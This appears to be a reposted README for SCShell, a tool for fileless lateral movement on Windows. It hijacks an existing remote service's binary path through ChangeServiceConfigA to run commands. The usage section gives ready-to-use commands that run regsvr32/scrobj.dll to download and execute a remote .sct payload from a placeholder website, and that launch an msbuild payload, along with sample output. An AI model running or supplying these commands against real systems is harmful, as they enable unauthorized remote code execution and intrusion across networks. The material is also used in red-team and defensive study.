**SCShell - Fileless Lateral Movement Tool That Relies On ChangeServiceConfigA To Run Command**

  

  
Fileless lateral movement tool that relies on ChangeServiceConfigA to run command. The beauty of this tool is that it doesn't perform authentication against SMB everything is performed over DCERPC.  
The utility can be used remotely WITHOUT registering a service or creating a service. It also doesn't have to drop any file on the [remote](https://www.kitploit.com/search/label/Remote "remote") system\* (Depend on the technique used to execute)  
  
  
**How it work**  
Instead of creating a service it simply remotely open a service and modify the [binary](https://www.kitploit.com/search/label/Binary "binary") path name via the `ChangeServiceConfigA` API.  
Then it starts the service.  
Once the execution is completed the service binary path is reverted to the original one. The original service path is extracted using `QueryServiceConfigA`.  
Everything is happening over DCERPC including the authentication.

**Usage**  
The current build is written in `C` but I will port it to `C#` and `PowerShell`.

```
Usage:  
SCShell.exe target service [payload](https://www.kitploit.com/search/label/Payload "payload") username domain password
```

`target` can be set to `local` to run the payload locally  
Remote execution

```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" administrator . Password
```

I recommend using `C:\windows\system32\cmd.exe /c` to make sure to payload will not be killed once the service stop. You NEED to use the full path.  
You can also use a msbuild payload

```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj" administrator . Password  
SCShell ***  
Trying to connect to 192.168.197.131  
Username was provided attempting to call LogonUserA  
SC_HANDLE Manager 0x009ED250  
Opening XblAuthManager  
SC_HANDLE Service 0x009ED1B0  
Service path was changed to C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj  
Service was started.
```

I'm using the XblAuthManager as the target which is the Xbox Accessory [Management](https://www.kitploit.com/search/label/Management "Management") Service  
  
**Compiling from source**  
The code was compiled on [Windows](https://www.kitploit.com/search/label/Windows "Windows") using GCC Mingw compiler
